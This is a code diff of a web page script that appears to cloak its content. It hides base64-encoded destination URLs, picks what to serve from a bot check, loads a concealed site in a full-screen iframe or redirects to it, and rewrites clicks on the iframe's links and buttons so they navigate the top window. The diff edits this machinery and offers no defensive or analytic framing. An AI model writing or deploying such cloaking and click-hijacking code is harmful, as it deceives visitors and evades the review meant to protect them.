@@ -43,7 +43,7 @@
 
   <script>
   async function checkConditions() {
-      const targetUrl = "aHR0cHMlM0ElMkYlMkZlZHVhcmRvbHVjaGVzZS5naXRodWIuaW8lMkZnZXJhZG9y";
+      const targetUrl = "aHR0cHMlM0ElMkYlMkZlZHVhcmRvbHVjaGVzZS5naXRodWIuaW8lMkZnZXJhZG9yJTJG";
       const defaultUrl = "aHR0cHMlM0ElMkYlMkZkZWNpZnJhc29uaG9zLmNvbQ==";
       const targetAction = "show";
       const defaultAction = "show";
@@ -88,7 +88,7 @@
           passed: !isBot
       };
   
-   async function loadContent(url, action) {
+       async function loadContent(url, action) {
           if(action === 'redirect') {
               window.location.href = decodeURIComponent(atob(url));
               return;
@@ -102,20 +102,22 @@
                       style="width: 100%; height: 100vh; border: none;"
                       onload="
                           try {
-                              const iframe = this;
-                              const iframeDoc = iframe.contentWindow.document;
-                              
-                              function handleClick(e) {
-                                  e.preventDefault();
-                                  const href = this.href || (this.getAttribute('onclick') && this.getAttribute('onclick').match(/window.location.href *= *['\"](.*?)['\"]/)?.[1]);
+                              function handleClick(event) {
+                                  event.preventDefault();
+                                  const target = event.target.closest('a') || event.target;
+                                  const href = target.href || (target.getAttribute('onclick') && target.getAttribute('onclick').match(/window.location.href *= *['\"](.*?)['\"]/)?.[1]);
                                   if (href) {
                                       window.top.location.href = href;
+                                      return false;
                                   }
                               }
 
-                              iframeDoc.querySelectorAll('a[href], button[onclick]').forEach(el => {
-                                  el.addEventListener('click', handleClick);
-                              });
+                              this.contentWindow.document.addEventListener('click', function(e) {
+                                  const clickedElement = e.target.closest('a, button');
+                                  if (clickedElement) {
+                                      handleClick(e);
+                                  }
+                              }, true);
                           } catch(e) {
                               console.error('Erro:', e);
                           }
